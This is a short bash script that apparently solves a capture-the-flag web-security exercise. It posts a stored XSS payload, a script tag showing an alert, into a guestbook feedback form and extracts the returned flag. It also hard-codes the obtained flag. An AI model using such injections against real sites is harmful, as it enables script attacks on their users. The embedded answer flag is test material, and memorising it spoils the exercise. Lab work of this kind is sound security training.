#!/bin/bash
#
# ./get-the-xss-feedback-flag.sh "ip"
# 

theme="xss feedback <SCRIPT>alert('YOU HAVE BEEN JINXED !!!!!!!!!!!!!!!!')</SCRIPT>"

function get_tools
{
	# $1: the command to test if here or need to install
	tool="${1}"
	which "${tool}" 2>&1 > /dev/null
	if [ $? -ne 0 ]
	then
		if [ `uname` = "Darwin" ]
		then
			brew install "${tool}"
		else
			apt-get install -y "${tool}"
		fi
		return 1
	fi
	return 0
}
get_tools "curl"

######################################################################################################
echo -e "\n\033[35m8. === ${theme} ===============================================\033[0m\n"

text="<SCRIPT>alert('YOU HAVE BEEN JINXED !!!!!!!!!!!!!!!!')</SCRIPT>"
echo -e "We want to inject: \033[33m${text}\033[0m\n"
flag=`curl -vLs --post301  --data-urlencode "btnSign=Sign Guestbook" --data-urlencode "mtxtMessage=alert" --data-urlencode "txtName=${text}" "${1}/?page=feedback" | grep -Eo "The flag is : [a-zA-Z0-9]*" | awk '{print $NF}'`
echo -e "Flag earned with xss injection: \033[31m${flag}\033[0m\n\nNow return on the website page with your browser, you will notice the attack."
# Cette requete est mal geree...
# flag obtenu 0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e
echo -e "\n\$\$\$ ${theme} \$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\n"
